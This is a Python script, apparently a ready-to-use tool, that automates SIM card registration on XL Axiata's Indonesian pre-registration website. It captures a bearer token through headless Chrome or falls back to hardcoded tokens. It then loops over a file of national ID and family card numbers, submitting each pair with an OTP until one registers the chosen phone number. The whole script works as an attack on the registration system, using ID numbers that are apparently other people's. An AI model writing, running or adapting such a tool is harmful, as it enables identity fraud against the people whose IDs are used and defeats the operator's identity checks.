import requests

def headers(bear):
    return {
        'accept': 'application/json, text/plain, */*', 'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {bear}', 'content-type': 'application/json',
        'origin': 'https://www.xlaxiata.co.id', 'referer': 'https://www.xlaxiata.co.id/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"macOS"', 'dnt': '1', 'priority': 'u=1, i',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    }

def bearer():
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    import json
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
    driver = webdriver.Chrome(service=Service(), options=chrome_options)

    try:
        driver.get("https://www.xlaxiata.co.id/registrasi/regbypuk/regbypukform")
        driver.implicitly_wait(10)
        for entry in driver.get_log('performance'):
            try:
                res = json.loads(entry['message'])['message']['params']['request']
                if res['method'] == 'POST' and 'generate-jwt' in res['url']:
                    bear = res['headers']['Authorization'].replace('Bearer ','')
                    break
            except: bear = "VzNicHIzR24wbjEzaW8yMDI0OmJ5ZHQybzI0KiE="
    finally: driver.quit()
    try: return requests.post('https://jupiter-ms-webprereg.xlaxiata.id/generate-jwt', headers=headers(bear)).json()['encryptToken']
    except: return "Ln9YN5trk3UUGHnHXoV8644+QEDWRf8qpLJ0tovzrhQVRjJKzRulyHxNIa8eos0pH7iNIePuPNOxNmY4sRnHZIPEPD7iKAX2Z8Z2qOucrAQ+h6Z98l7GQEoIrDwRTXAD7nLAyRnH9dVwzmidCPSH9dwWBE31I739FGTNKJdqB44Ieq3PIs1y1ay6eZgmNBY84QrE22qRYOzUFWX/68cCNwFoJJdf0BdZeKclWxJAasfLAHR1bnM5V8VkNiC+CZlWe08UiEGaltTDcp2hoLGsaYshcy48PIefK3WseHwQn1SvSERWWNbHO0F70RLz7V0CXOg222YN7LQdwhm2Nv1tiw=="

token = bearer()
number = input("NUMBER: ")
with open('nik.txt', 'r') as file:
    for line in file:
        NIK, KK = line.strip().split('|')
        response_otp_request = requests.post('https://jupiter-ms-webprereg.xlaxiata.id/request-otp', headers=headers(token), json={ "msisdn": number })
        OTP = input(f"NIK: {NIK} KK: {KK} OTP: ")
        response_otp_verification = requests.post('https://jupiter-ms-webprereg.xlaxiata.id/submit-registration-otp-non-biometric', headers=headers(token), json={ "msisdn": number, "nik": NIK, "kk": KK, "otpCode": OTP })
        try:
            if 'Success' in response_otp_verification.json():
                print(f"{number} SUCCESSFULLY REGISTERED")
                break
            else: print(f"{NIK} CAN'T BE USED TO REGISTER")
        except: pass
